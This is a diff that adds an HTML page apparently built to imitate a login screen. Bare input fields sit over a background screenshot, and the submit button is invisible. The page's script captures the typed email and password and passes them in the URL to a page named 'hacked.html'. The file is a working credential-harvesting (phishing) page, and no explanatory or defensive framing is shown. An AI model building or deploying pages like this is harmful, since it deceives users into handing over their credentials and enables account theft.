@@ -1,0 +1,59 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+    <style>
+        .loginImage {
+            display: block;
+            margin: 150px auto;
+            width: 410px;
+            background-image: url(img/login.png);
+            position: relative;
+            height: 320px;
+            background-repeat: no-repeat;
+        }
+
+        #email {
+            position: absolute;
+            top: 112px;
+            left: 80px;
+            width: 244px;
+            height: 17px;
+        }
+
+        #password {
+            position: absolute;
+            top: 175px;
+            left: 80px;
+            width: 244px;
+            height: 17px;
+        }
+
+        #submit {
+            position: relative;
+            width: 61px;
+            height: 20px;
+            left: 79px;
+            top: 250px;
+            background-color: transparent;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loginImage">
+        <input type="text" id="email" />
+        <input type="password" id="password" />
+        <button id="submit"></button>
+    </div>
+
+    <script>
+
+        document.getElementById("submit").onclick = function () {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            window.location.href = 'hacked.html?email=' + email + '&password=' + password;
+        };
+    </script>
+</body>
+</html>
